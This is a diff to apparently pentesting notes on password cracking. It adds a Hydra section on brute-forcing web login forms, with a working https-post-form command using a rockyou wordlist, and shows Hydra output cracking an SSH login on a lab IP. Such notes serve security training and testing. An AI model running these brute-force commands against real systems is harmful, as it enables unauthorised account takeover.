@@ -2,7 +2,7 @@
 description: The art of password cracking with John, Hashcat, and Hydra.
 ---
 
-# 🔓 Password Cracking
+# 🔓 Password Cracking/Bruteforcing
 
 ## Obtaining Hash
 
@@ -114,6 +114,26 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-13 17:08:
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
 [DATA] attacking ssh://192.168.81.60:22/
 [22][ssh] host: 192.168.81.60   login: eleanor   password: eleanor
+```
+
+{% embed url="https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/" %}
+
+### <mark style="color:yellow;">Using Hydra to Brute-Force Our First Login Page</mark>
+
+Hydra is a fairly straight forward tool to use, but we have to first understand what it needs to work correctly. We’ll need to provide the following in order to break in:
+
+* Login or Wordlist for Usernames
+* Password or Wordlist for Passwords
+* IP address or Hostname
+* HTTP Method (POST/GET)
+* Directory/Path to the Login Page
+* Request Body for Username/Password
+* A Way to Identify Failed Attempts
+
+Simple login page bruteforce:
+
+```
+sudo hydra -L emails -P rockyou.txt 10.10.10.10 https-post-form "/iredadmin/login:username=^USER^&password=^PASS^&form_login=Login&lang=en_US:Username or password is incorrect."
 ```
 
 ## Wordlist generators
